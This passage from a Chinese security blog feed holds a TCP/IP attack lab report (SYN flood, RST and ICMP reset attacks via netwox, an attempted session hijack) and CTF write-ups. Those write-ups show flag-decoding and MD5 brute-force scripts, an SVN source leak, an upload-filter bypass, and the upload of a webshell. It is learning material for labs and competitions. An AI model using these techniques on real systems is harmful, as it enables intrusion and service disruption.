src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/SYN-attacking2.png" alt="YN-attackin"></p><h5 id="关闭SYN-Cookie"><a href="#关闭SYN-Cookie" class="headerlink" title="关闭SYN Cookie"></a>关闭SYN Cookie</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># sysctl -a | grep cookie (Display the SYN cookie flag)</span><br><span class="line"># sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)</span><br><span class="line"># sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sysctl -a | grep cookie</span><br><span class="line">sysctl: reading key &quot;net.ipv6.conf.all.stable_secret&quot;</span><br><span class="line">sysctl: reading key &quot;net.ipv6.conf.default.stable_secret&quot;</span><br><span class="line">sysctl: reading key &quot;net.ipv6.conf.eth0.stable_secret&quot;</span><br><span class="line">sysctl: reading key &quot;net.ipv6.conf.lo.stable_secret&quot;</span><br><span class="line">net.ipv4.tcp_syncookies = 1</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/SYB-Cookie-ON.png" alt="YB-Cookie-O"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/SYN-attacking3-CookiesOn.png" alt="YN-attacking3-CookiesO"></p><h4 id="Task-4-TCP-RST-Attacks-on-telnet-and-ssh-Connections"><a href="#Task-4-TCP-RST-Attacks-on-telnet-and-ssh-Connections" class="headerlink" title="Task 4: TCP RST Attacks on telnet and ssh Connections"></a>Task 4: TCP RST Attacks on telnet and ssh Connections</h4><hr><h5 id="实验原理-2"><a href="#实验原理-2" class="headerlink" title="实验原理"></a>实验原理</h5><p>TCP头部中有一位被称为”reset flag”，如果接收到该位置为1的TCP报文，则计算机应该立即结束该TCP连接。造成<br>这种攻击的原因与SYN洪泛有类似之处，就是网络层、传输层对于伪造的数据包并没有鉴别能力。</p><h5 id="netwox-78-–help"><a href="#netwox-78-–help" class="headerlink" title="netwox 78 –help"></a>netwox 78 –help</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[03/31/2018 00:19] root@ubuntu:/home/seed# netwox 78 --help</span><br><span class="line">Title: Reset every TCP packet</span><br><span class="line">Usage: netwox 78 [-d device] [-f filter] [-s spoofip]</span><br><span class="line">Parameters:</span><br><span class="line"> -d|--device device             device name &#123;Eth0&#125;</span><br><span class="line"> -f|--filter filter             pcap filter</span><br><span class="line"> -s|--spoofip spoofip           IP spoof initialization type &#123;linkbraw&#125;</span><br><span class="line"> --help2                        display help for advanced parameters</span><br><span class="line">Example: netwox 78</span><br></pre></td></tr></table></figure><p>（1）建立A号和B号的telnet连接</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525086729467.png" alt="1525086729467"></p><p>（2）B号机发现23号端口被占用，建立起了连接</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525086810605.png" alt="1525086810605"></p><p>（3）kali主机进行攻击</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087044259.png" alt="1525087044259"></p><p>（4）返回A号机发现连接断开（回车一下）</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087076771.png" alt="1525087076771"></p><p>（5）B号机的23号端口不被占用</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087145255.png" alt="1525087145255"></p><p>（6）A号机尝试继续连接，连接不上。注意，此时kali的攻击并没有停止。</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087196894.png" alt="1525087196894"></p><p>（7）SSH进行同样的测试</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087367262.png" alt="1525087367262"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087398024.png" alt="1525087398024"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087422268.png" alt="1525087422268"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087439613.png" alt="1525087439613"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087457886.png" alt="1525087457886"></p><h4 id="Task-5-TCP-RST-Attacks-on-Video-Streaming-Applications"><a href="#Task-5-TCP-RST-Attacks-on-Video-Streaming-Applications" class="headerlink" title="Task (5) : TCP RST Attacks on Video Streaming Applications."></a>Task (5) : TCP RST Attacks on Video Streaming Applications.</h4><hr><p>打开一个视频</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087977000.png" alt="1525087977000"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525087955124.png" alt="1525087955124"></p><p>发起攻击</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525088076417.png" alt="1525088076417"></p><p>A号机已经连接不上视频+</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525088098137.png" alt="1525088098137"></p><h4 id="Task-6-ICMP-Blind-Connection-Reset-and-Source-Quench-Attacks"><a href="#Task-6-ICMP-Blind-Connection-Reset-and-Source-Quench-Attacks" class="headerlink" title="Task (6) : ICMP Blind Connection-Reset and Source-Quench Attacks"></a>Task (6) : ICMP Blind Connection-Reset and Source-Quench Attacks</h4><hr><h5 id="实验原理-3"><a href="#实验原理-3" class="headerlink" title="实验原理"></a>实验原理</h5><p>ICMP信息同样可以被用于达成连接重置攻击。为了达到这个目的，攻击者发送一条显示“硬错误”的ICMP的错误信息给TCP连接两端的任意一方。连接将会被立即中断，因为在RFC1122中主机在接收到这样一个TCMP错误包时，应当立即中断相关的连接。RFC1122定义“硬错误”为一个目的不可达且协议无效、端口无效、标志位缺失和DF位设置的ICMP错误信息</p><p>ICMP源端关闭信息被拥塞路由器用于告知TCP发送者减缓发送包的速度。攻击者可以制定这样的信息来实施对TCP发送者的拒绝服务攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netwox 82 --help</span><br><span class="line">Title: Sniff and send ICMP4/ICMP6 destination unreachable</span><br><span class="line">Usage: netwox 82 [-d device] [-f filter] [-c uint32] [-i ip]</span><br><span class="line">Parameters:</span><br><span class="line"> -d|--device device             device name &#123;Eth0&#125;</span><br><span class="line"> -f|--filter filter             pcap filter</span><br><span class="line"> -c|--code uint32               ICMP code &#123;0&#125;</span><br><span class="line"> -i|--src-ip ip                 source IP address &#123;192.168.100.138&#125;</span><br><span class="line"> --help2                        display help for advanced parameters</span><br><span class="line">Example: netwox 82</span><br></pre></td></tr></table></figure><p>（1）A和B建立telnet连接</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525088661405.png" alt="1525088661405"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525088723717.png" alt="1525088723717"></p><p>（2）kali主机进行攻击</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525088841501.png" alt="1525088841501"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525088890840.png" alt="1525088890840"></p><p>可以发现A收到了攻击，但是无效</p><p>出现这种情况的原因可能是在高版本的ubuntu中已经制订了一些策略来防止这些攻击。</p><h4 id="Task-7-TCP-Session-Hijacking"><a href="#Task-7-TCP-Session-Hijacking" class="headerlink" title="Task (7) : TCP Session Hijacking"></a>Task (7) : TCP Session Hijacking</h4><hr><h5 id="实验原理-4"><a href="#实验原理-4" class="headerlink" title="实验原理"></a>实验原理</h5><p>TCP会话劫持攻击，是劫持通信双方已建立的TCP会话连接，假冒其中一方的身份与另一方进行进一步通信。通常一些网络服务会建立在TCP会话之后进行<strong>应用层的身份认证</strong>，客户端在通过身份认证之后，就可以通过TCP会话连接对服务器索取资源。且<strong>期间不用再次进行身份认证。</strong>而TCP会话劫持为 攻击者提供了一种绕过应用层身份认证的技术途径，因此得到较高水平攻击者的青睐。</p><p>（1）安装hunt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install hunt</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525089968180.png" alt="1525089968180"></p><p>(2)A和B建立连接</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525090030820.png" alt="1525090030820"></p><p>（2）kali可以监听到A和B的telnet会话</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525090171296.png" alt="1525090171296"></p><p>（3）然后运行hunt，却发现hunt发现不了telnet连接，只能用netwox 40</p><p>找到最后一个数据包</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525091832339.png" alt="1525091832339"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525091741666.png" alt="1525091741666"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525092380837.png" alt="1525092380837"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525092408212.png" alt="1525092408212"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525094486692.png" alt="1525094486692"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525094581745.png" alt="1525094581745"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525094750881.png" alt="1525094750881"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525094823363.png" alt="1525094823363"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1525094834961.png" alt="1525094834961"></p><p>过程很痛苦，总之都失败了</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;TCP-IP&quot;&gt;&lt;a href=&quot;#TCP-IP&quot; class=&quot;headerlink&quot; title=&quot;TCP/IP&quot;&gt;&lt;/a&gt;TCP/IP&lt;/h3&gt;
    
    </summary>
    
    
      <category term="TCP,IP" scheme="http://blog.Lhaihai.wang/tags/TCP-IP/"/>
    
  </entry>
  
  <entry>
    <title>Upload</title>
    <link href="http://blog.Lhaihai.wang/2018/04/30/Upload/"/>
    <id>http://blog.Lhaihai.wang/2018/04/30/Upload/</id>
    <published>2018-04-30T15:11:15.000Z</published>
    <updated>2018-04-30T17:01:47.393Z</updated>
    
    <content type="html"><![CDATA[<p>第一届“百度杯”信息安全攻防总决赛 线上选拔赛</p><h4 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h4><p>来来来，都是套路，贼简单。</p><a id="more"></a><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Upload.assets/1525101300251.png" alt="1525101300251"></p><p>抓包分析一波，看来就是写脚本base64解码响应报头的flag，post上去</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Upload.assets/1525101369179.png" alt="1525101369179"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/4/30 22:46</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : fastman.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :第一届“百度杯”信息安全攻防总决赛 线上选拔赛</span></span><br><span class="line"><span class="string">                 题目名称：Upload</span></span><br><span class="line"><span class="string">                 题目内容：来来来，都是套路，贼简单。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://b495ad3915ae4a38b4c2598b19c1d99ca7f3058e9c154524.game.ichunqiu.com/'</span></span><br><span class="line">session = requests.session()</span><br><span class="line">r = session.get(url)</span><br><span class="line">temp = str(base64.b64decode(r.headers[<span class="string">'flag'</span>])).split(<span class="string">':'</span>)</span><br><span class="line">flag = temp[<span class="number">1</span>][<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">print(flag)</span><br><span class="line">flag2 = base64.b64decode(temp[<span class="number">1</span>])</span><br><span class="line">print(flag2)</span><br><span class="line">datas=&#123;</span><br><span class="line">    <span class="string">'ichunqiu'</span>:flag2</span><br><span class="line">&#125;</span><br><span class="line">r = session.post(url,data=datas)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>没想到flag要base64解码两次，</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Upload.assets/1525101554930.png" alt="1525101554930"></p><p>拿到path，</p><p>访问：题目给的url+path</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Upload.assets/1525101613558.png" alt="1525101613558"></p><p>点Webcome，下滑出现登录表单</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Upload.assets/1525101635953.png" alt="1525101635953"></p><p>又是md5截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/4/30 23:06</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : md5截断.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span>  hashlib.md5(str(s).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99999999</span>):</span><br><span class="line">        <span class="keyword">if</span>(md5(i)[<span class="number">0</span>:<span class="number">6</span>] == str(s)):</span><br><span class="line">            print(i)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main(<span class="string">'9ea8da'</span>)</span><br></pre></td></tr></table></figure><p>但是我们还不知道用户名和密码</p><p>挂目录扫描器一扫，发现有svn源码泄露，</p><p>访问访问 URL+/xxxx/.svn/wc.db (SVN 源码泄露漏洞)</p><p>即可获得username is md5(HEL1OW10rDEvery0n3)</p><p>wc.db是固定的，只能说多多积累经验了</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Upload.assets/1525102832393.png" alt="1525102832393"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：8638d5263ab0d3face193725c23ce095</span><br><span class="line">password: 123456</span><br><span class="line">captcha : xxx</span><br></pre></td></tr></table></figure><p>登录有弹窗</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Upload.assets/1525103036129.png" alt="1525103036129"></p><p>访问 xxxxxx.php</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Upload.assets/1525103197005.png" alt="1525103197005"></p><p>上传个图片，大小写不行，加个空格不行，那就试试1,2,3,4,5，也不行，最后试试pht,phtml</p><p>终于成了</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Upload.assets/1525104317552.png" alt="1525104317552"></p><p>后来发现一位大哥的md5截断，随机来，记录一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> hashlib</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(str)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    string = <span class="string">''</span></span><br><span class="line">    s = string.join(random.sample(<span class="string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span>,<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">if</span> md5(s)[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">'e63f44'</span>:</span><br><span class="line">        <span class="keyword">print</span> s</span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"><span class="comment">#substr(md5($str), 0, 6) ===</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一届“百度杯”信息安全攻防总决赛 线上选拔赛&lt;/p&gt;
&lt;h4 id=&quot;题目内容：&quot;&gt;&lt;a href=&quot;#题目内容：&quot; class=&quot;headerlink&quot; title=&quot;题目内容：&quot;&gt;&lt;/a&gt;题目内容：&lt;/h4&gt;&lt;p&gt;来来来，都是套路，贼简单。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="I春秋" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/I%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="upload" scheme="http://blog.Lhaihai.wang/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>Do you know upload？</title>
    <link href="http://blog.Lhaihai.wang/2018/04/30/Do%20you%20know%20upload%EF%BC%9F/"/>
    <id>http://blog.Lhaihai.wang/2018/04/30/Do you know upload？/</id>
    <published>2018-04-30T14:32:42.000Z</published>
    <updated>2018-04-30T17:02:01.214Z</updated>
    
    <content type="html"><![CDATA[<p>第三届“百越杯”福建省高校网络空间安全大赛</p><h4 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h4><p>加油吧，少年。</p><a id="more"></a><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>进来一看，图片上传</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Do%20you%20know%20upload%EF%BC%9F.assets/1525098886751.png" alt="1525098886751"></p><p>顺手上传个菜刀，只要改一改content-type绕过</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Do%20you%20know%20upload%EF%BC%9F.assets/1525098946585.png" alt="1525098946585"></p><p>然后连接，发现<code>config.php</code>，下载。而且有<code>ctf.sql</code>。估计flag在数据库，下载<code>ctf.sql</code>打开，<code>ERROR:// Can Not Read</code>，只能搞数据库了</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/Do%20you%20know%20upload%EF%BC%9F.assets/1525098998032.png" alt="1525098998032"></p><p>config.php打开一看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span 